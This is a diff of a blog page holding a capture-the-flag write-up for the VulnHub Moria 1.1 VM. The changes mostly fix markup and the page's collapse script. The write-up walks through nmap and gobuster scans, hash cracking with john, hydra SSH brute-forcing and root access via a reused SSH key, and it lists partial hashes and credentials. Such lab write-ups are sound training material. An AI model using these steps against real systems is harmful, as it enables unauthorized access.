@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,13 +33,13 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Moria: 1.1</h1>
-                  <p class="nested"><a href="/posts/20191011_vulnhub-misdirection1.html"> « </a>📅 published on <code>17/Oct/2019</code><a href="/posts/20191021_vulnhub-mrrobot1.html"> » </a></p>
+                  <p><a href="/posts/20191011_vulnhub-misdirection1.html"> « </a>📅 published on <code>17/Oct/2019</code><a href="/posts/20191021_vulnhub-mrrobot1.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/moria-1,187/">Moria: 1.1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_moria11/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Fri Oct 11 15:31:50 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/xml/_quick_tcp_nmap.xml 192.168.92.188
+<pre class="nested"><code># Nmap 7.70 scan initiated Fri Oct 11 15:31:50 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/xml/_quick_tcp_nmap.xml 192.168.92.188
 Nmap scan report for 192.168.92.188
 Host is up, received arp-response (0.0019s latency).
 Scanned at 2019-10-11 15:32:02 PDT for 15s
@@ -101,13 +68,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. We find a possible username from FTP banner:  </p>
-<p class="nested"re><code>PORT   STATE SERVICE REASON         VERSION
+<pre class="nested"><code>PORT   STATE SERVICE REASON         VERSION
 21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
 |_banner: 220 Welcome Balrog!
 </code></pre>
 
 <p class="nested">3. We find a few interesting directories from <code>gobuster</code> scan. Exploring the <code>http://192.168.92.188:80/w</code> link, we follow it till the <code>http://192.168.92.188/w/h/i/s/p/e/r/the_abyss/</code> link which shows some random text:  </p>
-<p class="nested"re><code>http://192.168.92.188:80/cgi-bin/ (Status: 403) [Size: 210]
+<pre class="nested"><code>http://192.168.92.188:80/cgi-bin/ (Status: 403) [Size: 210]
 http://192.168.92.188:80/cgi-bin/.html (Status: 403) [Size: 215]
 http://192.168.92.188:80/index.php (Status: 200) [Size: 85]
 http://192.168.92.188:80/index.php (Status: 200) [Size: 85]
@@ -122,7 +89,7 @@ http://192.168.92.188/w/h/i/s/p/e/r/the_abyss/
 <p class="nested">5. We run <code>wireshark</code> with a display filter <code>ip.addr == 192.168.92.188</code> to limit noise. In some time we see a bunch of <code>SYN</code> packets being sent to us from the target system. These packets are sent to following ports: <code>77, 101, 108, 108, 111, 110</code>  </p>
 <p class="nested"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_moria11/screenshot04.png" />  </p>
 <p class="nested">6. We try to knock these ports on the target system but nothing changed. Upon further exploration, it is found that the sequence actually is the ASCII values for a string <code>Mellon</code> that could be the password for the only known username we have as of now: <code>Balrog</code>  </p>
-<p class="nested"re><code>nmap -Pn --host-timeout 100 --max-retries 0 -sS -p 77, 101, 108, 108, 111, 110
+<pre class="nested"><code>nmap -Pn --host-timeout 100 --max-retries 0 -sS -p 77, 101, 108, 108, 111, 110
 python -c 'print &quot;&quot;.join([chr(x) for x in [77, 101, 108, 108, 111, 110]])'
   Mellon
 </code></pre>
@@ -130,7 +97,7 @@ python -c 'print &quot;&quot;.join([chr(x) for x in [77, 101, 108, 108, 111, 110
 <p class="nested"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_moria11/screenshot05.png" />  </p>
 <p class="nested"><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_vulnhub_moria11/screenshot06.png" />  </p>
 <p class="nested">7. We tried to connect to FTP service with the <code>Balrog/Mellon</code> credentials but for some reason it didn't work:  </p>
-<p class="nested"re><code>ftp 192.168.92.188
+<pre class="nested"><code>ftp 192.168.92.188
   Balrog
   Mellon
 </code></pre>
@@ -140,35 +107,35 @@ python -c 'print &quot;&quot;.join([chr(x) for x in [77, 101, 108, 108, 111, 110
 <p class="nested"><img alt="writeup.enumeration.steps.8.1" src="/static/files/posts_vulnhub_moria11/screenshot08.png" />  </p>
 <p class="nested"><img alt="writeup.enumeration.steps.8.2" src="/static/files/posts_vulnhub_moria11/screenshot09.png" />  </p>
 <p class="nested">9. This file lists several usernames and what looks like password hashes. The page source also reveals the password salts and hash format as <code>MD5(MD5(Password).Salt)</code>. We find a good <a href="https://github.com/piyushcse29/john-the-ripper/blob/master/doc/DYNAMIC">reference</a> for <code>john</code>'s dynamic hash variants. We create a <code>hashes</code> file by adding usernames, hashes and salts to it. We can now use <code>john</code> to crack these hashes:  </p>
-<p class="nested"re><code>john --format=dynamic_6 hashes
+<pre class="nested"><code>john --format=dynamic_6 hashes
 </code></pre>
 
 <p class="nested"><img alt="writeup.enumeration.steps.9.1" src="/static/files/posts_vulnhub_moria11/screenshot10.png" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>21/tcp  |  ftp   |  vsftpd 2.0.8 or later
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>21/tcp  |  ftp   |  vsftpd 2.0.8 or later
 22/tcp  |  ssh   |  OpenSSH 6.6.1 (protocol 2.0)
 80/tcp  |  http  |  Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
 </code></pre>
 
-<h4>Files</h4>
-<p class="nested"re><code>http://192.168.92.188/QlVraKW4fbIkXau9zkAPNGzviT3UKntl
+<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
+<pre class="nested"><code>http://192.168.92.188/QlVraKW4fbIkXau9zkAPNGzviT3UKntl
 </code></pre>
 
-<h4>Users</h4>
-<p class="nested"re><code>ftp: Balrog
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>ftp: Balrog
 </code></pre>
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We are able to successfully crack hashes for all users from this list and can now use <code>hydra</code> to check which username/password combo actually works. We find that the <code>Ori/spanky</code> credentials allow us SSH access to the target system:  </p>
-<p class="nested"re><code>hydra -C creds 192.168.92.188 -t 4 ssh
+<pre class="nested"><code>hydra -C creds 192.168.92.188 -t 4 ssh
 ssh Ori@192.168.92.188
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_moria11/screenshot11.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_moria11/screenshot12.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>Ori@Moria&gt; id
+<pre class="nested"><code>Ori@Moria&gt; id
 uid=1002(Ori) gid=1003(notBalrog) groups=1003(notBalrog)
 Ori@Moria&gt;  
 Ori@Moria&gt; uname
@@ -192,26 +159,26 @@ Ori
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We find that the user <code>Ori</code> has an entry for <code>localhost</code> within the <code>.ssh/known_hosts</code> file. This means, if local SSH configuration allows <code>root</code> user login and user <code>Ori</code>'s public key is in the <code>authorized_keys</code> of <code>root</code> user, we can SSH as <code>root</code> to localhost using <code>Ori</code>'s public key:  </p>
-<p class="nested"re><code>ssh -i id_rsa root@192.168.92.188
+<pre class="nested"><code>ssh -i id_rsa root@192.168.92.188
 </code></pre>
 
 <p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_moria11/screenshot13.png" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_moria11/screenshot14.png" />  </p>
 <p class="nested">2. We gain elevated access using the above technqiue and can now view the flag to complete the challenge:  </p>
-<p class="nested"re><code>cat /root/flag.txt
+<pre class="nested"><code>cat /root/flag.txt
 </code></pre>
 
 <p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_moria11/screenshot15.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<p class="nested"re><code>root:$6$P7ElNgGp$fNzyy4OgqSR1ANJXTgbpzp4U42JXG1qJ55iNV10NVJoX5UWjtckWD0oHmcTOj0lqObyWhFu2y3udHVpHa........................
+<pre class="nested"><code>root:$6$P7ElNgGp$fNzyy4OgqSR1ANJXTgbpzp4U42JXG1qJ55iNV10NVJoX5UWjtckWD0oHmcTOj0lqObyWhFu2y3udHVpHa........................
 abatchy:$6$xEq/159Q$ScuKnynbwTBdFA4B9w6OqKxQpWPGpofi59McVuP6T1SADKhNy4n33Ovkk0hwZQkx72XriPSIrc2ubr16O........................
 Balrog:$6$J6kuCfxq$L5ALsHRYfOu0bVV9MbW3.VZOUVEaKSWhfPIq5wXUFV407tpvH8Zx7WdbJeXgdWoPo9LU8eIznf0d44qoF........................
 Ori:$6$1zYgjEIM$VQ0gvU7JjenS9WuiVjSeva8pbWnEXjqTmEdFnQRXKmTmXPXmt55/oyup40NiXD8J9GxmXF7DYiaHZDRshr.......................
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<p class="nested"re><code>ftp: Balrog/Mel...
+<pre class="nested"><code>ftp: Balrog/Mel...
 ssh: Ori/span..
 </code></pre>
 
@@ -220,19 +187,17 @@ ssh: Ori/span..
 <li><a href="https://www.vulnhub.com/entry/moria-11,187/">https://www.vulnhub.com/entry/moria-11,187/</a>  </li>
 <li><a href="https://phackt.com/moria-vulnhub">https://phackt.com/moria-vulnhub</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20191011_vulnhub-misdirection1.html">[VulnHub] Misdirection: 1...</a> « | » <a href="/posts/20191021_vulnhub-mrrobot1.html">[VulnHub] Mr-Robot: 1...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191011_vulnhub-misdirection1.html">[VulnHub] Misdirection: 1...</a> « | » <a href="/posts/20191021_vulnhub-mrrobot1.html">[VulnHub] Mr-Robot: 1...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -240,6 +205,10 @@ ssh: Ori/span..
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
